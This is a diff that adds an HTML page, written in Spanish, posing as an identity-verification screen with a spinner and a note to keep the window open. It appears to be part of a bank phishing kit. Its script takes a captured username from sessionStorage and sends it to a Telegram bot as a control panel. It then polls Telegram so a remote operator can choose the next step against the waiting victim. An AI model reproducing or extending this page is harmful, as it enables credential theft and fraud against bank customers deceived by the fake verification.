@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificando identidad...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 48px 32px 44px;
+      width: 340px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .logo { width: 180px; margin-bottom: 36px; }
+    .spinner {
+      width: 56px; height: 56px;
+      border: 5px solid #e0e0e0;
+      border-top-color: #0057A8;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 24px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { color: #0057A8; font-size: 18px; font-weight: 700; margin-bottom: 12px; }
+    p  { color: #555; font-size: 14px; line-height: 1.6; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="logo.png" alt="Logo" class="logo" onerror="this.style.display='none'"/>
+    <div class="spinner"></div>
+    <h2>Verificando su identidad</h2>
+    <p>Estamos validando su información de forma segura.<br>Por favor, no cierre esta ventana.</p>
+  </div>
+
+  <script src="tg.js"></script>
+  <script>
+    const contexto = sessionStorage.getItem('bdv_contexto') || 'Selecciona la acción:';
+    const usuario  = sessionStorage.getItem('bdv_usuario')  || 'Desconocido';
+    sessionStorage.removeItem('bdv_contexto');
+
+    async function init() {
+      // 1. Primero obtener el último update_id ANTES de enviar el panel
+      //    así ignoramos cualquier botón viejo que estuviera pendiente
+      const lastId = await getLastUpdateId();
+
+      // 2. Enviar el panel de botones al bot
+      await tg('panel', { context: `👤 Usuario: \`${usuario}\`\n\n${contexto}` });
+
+      // 3. Arrancar polling solo desde updates NUEVOS (posteriores al panel)
+      pollTelegram(lastId);
+    }
+
+    init();
+  </script>
+</body>
+</html>
